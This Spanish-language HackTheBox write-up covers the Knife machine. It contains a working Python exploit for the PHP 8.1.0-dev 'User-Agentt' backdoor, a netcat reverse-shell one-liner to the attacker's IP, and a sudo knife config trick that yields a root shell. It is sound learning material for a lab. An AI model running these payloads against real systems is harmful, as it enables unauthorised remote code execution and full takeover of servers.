I"_<p><img src="assets/knife.jpeg" alt="Knife" /><!--{:width="800px" width="1000px"}-->
<a href="https://app.hackthebox.eu/machines/Knife">Sitio Oficial de la maquina</a></p>

<p>Knife es una maquina retirada de HackTheBox</p>

<h1 id="enumeracion"><a href="#header-1"></a>Enumeracion</h1>
<p>Lanzamos un nmap para descubrir los puertos abiertos</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-Pn</span> <span class="nt">-oA</span> target 10.10.10.242
Nmap scan report <span class="k">for </span>10.10.10.242
Host is up <span class="o">(</span>0.17s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 <span class="o">(</span>RSA<span class="o">)</span>
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
<span class="c"># Nmap done at Thu Sep  9 12:01:55 2021 -- 1 IP address (1 host up) scanned in 26.67 seconds</span>
</code></pre></div></div>
<h4 id="comandos-utilizados"><a href="#header-4"></a>Comandos utilizados</h4>
<blockquote>
  <p><code class="language-plaintext highlighter-rouge">-sC:</code> serie basicos de scripts</p>

  <p><code class="language-plaintext highlighter-rouge">-sV:</code> para detectar el servicio/version del puerto</p>

  <p><code class="language-plaintext highlighter-rouge">-sS:</code> TCP SYNK port scan, se envían solo paquetes de tipo SYN (inicio de conexión) y mediante el tipo de respuesta RST/ACK (no existe)o SYN/ACK (si existe) determina si esta corriendo algún servicio en el puerto</p>

  <p><code class="language-plaintext highlighter-rouge">-p- --open:</code> para que reporte los puertos con estado abierto</p>

  <p><code class="language-plaintext highlighter-rouge">--min-rate 500:</code> para que envie paquetes N paquetes por segundo, esto hace mas rapido el escaneo</p>

  <p><code class="language-plaintext highlighter-rouge">-Pn:</code> indicamos que no realice reconocimiento de host</p>

  <p><code class="language-plaintext highlighter-rouge">-oA:</code> exportamos la informacion en todos los formatos, en caso que quieras hacer un reporte mas detallado</p>
</blockquote>

<p>Tenemos dos puertos 22 y 80, antes de ir directamente al sitio a investigar vamos a lanzar un whatweb para ver a que nos enfrentamos</p>

<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">whatweb</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">242</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">242</span> <span class="p">[</span><span class="mi">200</span> <span class="n">OK</span><span class="p">]</span> <span class="n">Apache</span><span class="p">[</span><span class="mi">2</span><span class="p">.</span><span class="mi">4</span><span class="p">.</span><span class="mi">41</span><span class="p">],</span> <span class="n">Country</span><span class="p">[</span><span class="n">RESERVED</span><span class="p">][</span><span class="n">ZZ</span><span class="p">],</span> <span class="n">HTML5</span><span class="p">,</span>
<span class="n">HTTPServer</span><span class="p">[</span><span class="n">Ubuntu</span> <span class="n">Linux</span><span class="p">][</span><span class="n">Apache</span><span class="o">/</span><span class="mi">2</span><span class="p">.</span><span class="mi">4</span><span class="p">.</span><span class="mi">41</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)],</span> 
<span class="n">IP</span><span class="p">[</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">242</span><span class="p">],</span> <span class="n">PHP</span><span class="p">[</span><span class="mi">8</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">0</span><span class="o">-</span><span class="n">dev</span><span class="p">],</span> <span class="n">Script</span><span class="p">,</span> <span class="n">Title</span><span class="p">[</span><span class="n">Emergent</span> <span class="n">Medical</span> <span class="n">Idea</span><span class="p">],</span> <span class="n">X</span><span class="o">-</span><span class="n">Powered</span><span class="o">-</span><span class="n">By</span><span class="p">[</span><span class="n">PHP</span><span class="o">/</span><span class="mi">8</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">0</span><span class="o">-</span><span class="n">dev</span><span class="p">]</span>
</code></pre></div></div>

<p>Informacion relevante <span style="color:yellow"><strong>Apache[2.4.41]</strong> <strong>PHP[8.1.0-dev]</strong></span></p>

<p>Agregamos la direccion del equipo al <span style="color:green">/etc/hosts</span> esto realmente no siempre es necesario pero en mi experiencia es recomendable para no omitir nada del sitio. Con el comando <code class="language-plaintext highlighter-rouge">sudo vim /etc/hosts</code> agregamos la linea <code class="language-plaintext highlighter-rouge">10.10.10.242 knife.htb</code> quedando el archivo de la siguiente manera</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Host addresses</span>
127.0.0.1  localhost
10.10.10.242 knife.htb
::1        localhost ip6-localhost ip6-loopback
ff02::1    ip6-allnodes
ff02::2    ip6-allrouters
</code></pre></div></div>
<p>Ingresamos al sitio para ver de que se trata</p>

<p><img src="assets/knife_site.jpg" alt="Web-Site" /></p>

<p>Despues de varias vueltas por el sitio, revisando el codigo fuente <code class="language-plaintext highlighter-rouge">ctrl + u</code> mirando los archivos <code class="language-plaintext highlighter-rouge">.js</code> no encontre nada util</p>

<h1 id="explotacion"><a href="#header-2"></a>Explotacion</h1>

<p>Volviendo a lo que habiamos encontrado con <code class="language-plaintext highlighter-rouge">whatweb</code> vamos a buscar algun exploit para <span style="color:yellow"><strong>PHP [8.1.0-dev]</strong></span></p>

<p><img src="assets/PHP_8.1.0-dev.jpg" alt="PHP_8.1.0-dev" /></p>

<p>Ingresamos al primer enlace y leemos el exploit para entender como utilizarlo, bueno eso seria lo idea ya que estamos aprendiendo, peeero tambien podemos descargarlo darle privilegios de ejecucion y utilizarlo directamente xD</p>

<p>Obtenemos el exploit 49933.py</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Exploit Title: PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution
# Date: 23 may 2021
# Exploit Author: flast101
# Vendor Homepage: https://www.php.net/
# Software Link: 
#     - https://hub.docker.com/r/phpdaily/php
#    - https://github.com/phpdaily/php
# Version: 8.1.0-dev
# Tested on: Ubuntu 20.04
# References:
#    - https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a
#   - https://github.com/vulhub/vulhub/blob/master/php/8.1-backdoor/README.zh-cn.md
</span>
<span class="s">"""
Blog: https://flast101.github.io/php-8.1.0-dev-backdoor-rce/
Download: https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/backdoor_php_8.1.0-dev.py
Contact: flast101.sec@gmail.com

An early release of PHP, the PHP 8.1.0-dev version was released with a backdoor on March 28th 2021, 
but the backdoor was quickly discovered and removed. If this version of PHP runs on a server, an 
attacker can execute arbitrary code by sending the User-Agentt header.
The following exploit uses the backdoor to provide a pseudo shell ont the host.
"""</span>

<span class="c1">#!/usr/bin/env python3
</span><span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">re</span>
<span class="kn">import</span> <span class="nn">requests</span>

<span class="n">host</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"Enter the full host url:</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
<span class="n">request</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">host</span><span class="p">)</span>

<span class="k">if</span> <span class="nb">str</span><span class="p">(</span><span class="n">response</span><span class="p">)</span> <span class="o">==</span> <span class="s">'&lt;Response [200]&gt;'</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Interactive shell is opened on"</span><span class="p">,</span> <span class="n">host</span><span class="p">,</span> <span class="s">"</span><span class="se">\n</span><span class="s">Can't acces tty; job crontol turned off."</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
            <span class="n">cmd</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"$ "</span><span class="p">)</span>
            <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s">"User-Agent"</span><span class="p">:</span> <span class="s">"Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"</span><span class="p">,</span>
            <span class="s">"User-Agentt"</span><span class="p">:</span> <span class="s">"zerodiumsystem('"</span> <span class="o">+</span> <span class="n">cmd</span> <span class="o">+</span> <span class="s">"');"</span>
            <span class="p">}</span>
            <span class="n">response</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">headers</span> <span class="o">=</span> <span class="n">headers</span><span class="p">,</span> <span class="n">allow_redirects</span> <span class="o">=</span> <span class="bp">False</span><span class="p">)</span>
            <span class="n">current_page</span> <span class="o">=</span> <span class="n">response</span><span class="p">.</span><span class="n">text</span>
            <span class="n">stdout</span> <span class="o">=</span> <span class="n">current_page</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'&lt;!DOCTYPE html&gt;'</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
            <span class="n">text</span> <span class="o">=</span> <span class="k">print</span><span class="p">(</span><span class="n">stdout</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="k">except</span> <span class="nb">KeyboardInterrupt</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Exiting..."</span><span class="p">)</span>
        <span class="nb">exit</span>

<span class="k">else</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\r</span><span class="s">"</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Host is not available, aborting..."</span><span class="p">)</span>
    <span class="nb">exit</span>
</code></pre></div></div>

<p>Una vez que entendemos como funciona el script es hora de utilizarlo, damos permiso de ejecucion al archivo con <code class="language-plaintext highlighter-rouge">chmod +x 49933.py</code> y ejecutamos</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 49933.py                  
Enter the full host url:
http://knife.htb/

Interactive shell is opened on http://knife.htb/ 
Can<span class="s1">'t acces tty; job crontol turned off.
$ whoami
james

$ ls
bin
boot
cdrom
dev
etc
home
lib
lib32
lib64
libx32
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var 

</span></code></pre></div></div>

<p><img src="assets/tenor.gif" alt="YEES!" width="60px" /> Obtenemos acceso al equipo!!</p>

<p>Ya que podemos ejecutar comandos desde la terminar, para que sea mas comodo a la hora de explorar los ficheros vamos a entablarnos una reverse shell y hacer un tratamiento de la <span style="color:red">tty</span> para obtener una terminal interactiva y poder utilizar los comados <code class="language-plaintext highlighter-rouge">ctrl + l</code> o <code class="language-plaintext highlighter-rouge">ctrl + c</code> y el autocompletado(<span style="color:red">!!</span>).</p>

<h4 id="reverse-shell"><a href="#header-4"></a>Reverse Shell</h4>

<p>En la sesion que ganamos acceso a la maquina ejecutamos</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">rm</span> /tmp/f<span class="p">;</span><span class="nb">mkfifo</span> /tmp/f<span class="p">;</span><span class="nb">cat</span> /tmp/f|/bin/sh <span class="nt">-i</span> 2&gt;&amp;1|nc 10.10.15.25 4242 <span class="o">&gt;</span>/tmp/f
</code></pre></div></div>

<blockquote>
  <p>Adecuamos el comando ingresando la direccion de nuestra maquina <code class="language-plaintext highlighter-rouge">10.10.15.25</code> y el puerto de escucha <code class="language-plaintext highlighter-rouge">4242</code></p>
</blockquote>

<p>En otra ventana en nuestra maquina de atacante vamos a ponernos en escucha en el puerto <code class="language-plaintext highlighter-rouge">4242</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvnp</span> 4242
</code></pre></div></div>

<h4 id="tratamiento-de-la-tty"><a href="#header-4"></a>Tratamiento de la tty</h4>

<p>Una vez que tengamos la reverse shell procedemos a ejecutar</p>

<p><img src="assets/stty.jpg" alt="stty" /></p>

<p>Por ultimo exportamos el emulador de la terminal, la shell y adecuamos para que cuadre con la proporcion de la pantalla de nuestra maquina</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>james@knife:/<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
james@knife:/<span class="nv">$ </span><span class="nb">export </span><span class="nv">SHELL</span><span class="o">=</span>bash
james@knife:/<span class="nv">$ </span><span class="nb">stty </span>rows 45 columns 125
</code></pre></div></div>

<p>Para mi caso las filas valen 45 y las columnas 125, para identificar cuales son las proporciones de tu pantalla podrias ejecutar</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">stty</span> <span class="nt">-a</span>           
speed 38400 baud<span class="p">;</span> rows 45<span class="p">;</span> columns 125<span class="p">;</span> line <span class="o">=</span> 0<span class="p">;</span>

</code></pre></div></div>

<p>Ya podemos leer la flag del usuario</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>james@knife:/<span class="nv">$ </span><span class="nb">cat</span> /home/james/user.txt 
66bb684b17cf200e47438d902018558e
james@knife:/<span class="nv">$ </span>

</code></pre></div></div>

<h1 id="escalada-de-privilegios"><a href="#header-1"></a>Escalada de privilegios</h1>

<p>En este punto podriamos aprovecharnos de scripts automatizados como linpeas, pero vamos por lo basico…</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>james@knife:/<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>james on knife:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User james may run the following commands on knife:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/knife
james@knife:/<span class="err">$</span>
</code></pre></div></div>

<p>Ahaaaa podemos ejecutar el archivo <code class="language-plaintext highlighter-rouge">/usr/bin/knife</code> como root sin proporcinar nuestra contrasenha de usuario <code class="language-plaintext highlighter-rouge">james</code>, pues a probarlo</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>james@knife:~<span class="nv">$ </span><span class="nb">sudo </span>knife
ERROR: You need to pass a sub-command <span class="o">(</span>e.g., knife SUB-COMMAND<span class="o">)</span>

Usage: knife sub-command <span class="o">(</span>options<span class="o">)</span>
    <span class="nt">-s</span>, <span class="nt">--server-url</span> URL             Chef Infra Server URL.
        <span class="nt">--chef-zero-host</span> HOST        Host to start Chef Infra Zero on.
        <span class="nt">--chef-zero-port</span> PORT        Port <span class="o">(</span>or port range<span class="o">)</span> to start Chef Infra Zero on. Port ranges like 1000,1010 or 8889-9999 will try all given ports <span class="k">until </span>one works.
    <span class="nt">-k</span>, <span class="nt">--key</span> KEY                    Chef Infra Server API client key.
        <span class="nt">--</span><span class="o">[</span>no-]color                 Use colored output, defaults to enabled.
    <span class="nt">-c</span>, <span class="nt">--config</span> CONFIG              The configuration file to use.
        <span class="nt">--config-option</span> <span class="nv">OPTION</span><span class="o">=</span>VALUE Override a single configuration option.
        <span class="nt">--defaults</span>                   Accept default values <span class="k">for </span>all questions.
    <span class="nt">-d</span>, <span class="nt">--disable-editing</span>            Do not open EDITOR, just accept the data as is.
    <span class="nt">-e</span>, <span class="nt">--editor</span> EDITOR              Set the editor to use <span class="k">for </span>interactive commands.
    <span class="nt">-E</span>, <span class="nt">--environment</span> ENVIRONMENT    Set the Chef Infra Client environment <span class="o">(</span>except <span class="k">for in </span>searches, where this will be flagrantly ignored<span class="o">)</span><span class="nb">.</span>
        <span class="nt">--</span><span class="o">[</span>no-]fips                  Enable FIPS mode.
    <span class="nt">-F</span>, <span class="nt">--format</span> FORMAT              Which format to use <span class="k">for </span>output. <span class="o">(</span>valid options: <span class="s1">'summary'</span>, <span class="s1">'text'</span>, <span class="s1">'json'</span>, <span class="s1">'yaml'</span>, or <span class="s1">'pp'</span><span class="o">)</span>
        <span class="nt">--</span><span class="o">[</span>no-]listen                Whether a <span class="nb">local </span>mode <span class="o">(</span><span class="nt">-z</span><span class="o">)</span> server binds to a port.
    <span class="nt">-z</span>, <span class="nt">--local-mode</span>                 Point knife commands at <span class="nb">local </span>repository instead of Chef Infra Server.
    <span class="nt">-u</span>, <span class="nt">--user</span> USER                  Chef Infra Server API client username.
        <span class="nt">--print-after</span>                Show the data after a destructive operation.
        <span class="nt">--profile</span> PROFILE            The credentials profile to <span class="k">select</span><span class="nb">.</span>
    <span class="nt">-V</span>, <span class="nt">--verbose</span>                    More verbose output. Use twice <span class="o">(</span><span class="nt">-VV</span><span class="o">)</span> <span class="k">for </span>additional verbosity and three <span class="nb">times</span> <span class="o">(</span><span class="nt">-VVV</span><span class="o">)</span> <span class="k">for </span>maximum verbosity.
    <span class="nt">-v</span>, <span class="nt">--version</span>                    Show Chef Infra Client version.
    <span class="nt">-y</span>, <span class="nt">--yes</span>                        Say <span class="nb">yes </span>to all prompts <span class="k">for </span>confirmation.
    <span class="nt">-h</span>, <span class="nt">--help</span>                       Show this <span class="nb">help </span>message.
</code></pre></div></div>

<p>Una busqueda rapida para entender a que nos enfrentamos y encontre el siguiente link</p>

<p><a href="https://docs.chef.io/workstation/knife_setup/">knife_setup</a></p>

<p>con el comando <code class="language-plaintext highlighter-rouge">-c</code> podemos indicarle la ruta del archivo de configuracion, procedemos a crear un archivo en el directorio <code class="language-plaintext highlighter-rouge">/home/james</code> quedando de la siguiente manera</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>james@knife:~<span class="nv">$ </span><span class="nb">cat </span>expl.rb 
<span class="nb">exec</span> <span class="s2">"/bin/bash -i"</span>
</code></pre></div></div>

<p>Con esto solo nos queda ejecutar el comando</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>james@knife:~<span class="nv">$ </span><span class="nb">sudo </span>knife user list <span class="nt">-c</span> expl.rb 
root@knife:/home/james# <span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
root@knife:/home/james# <span class="nb">cat</span> /root/root.txt
94fb18c7c7913defff161e6181f399d4
root@knife:/home/james# 
</code></pre></div></div>

<p>Y tenemos acceso root y podemos leer la flag!!
<img src="assets/celebdark.gif" alt="" /></p>

<p>Espero que esta guia haya sido de ayuda para tu aprendizaje, estare subiendo mas writeups en los proximos dias :D</p>
:ET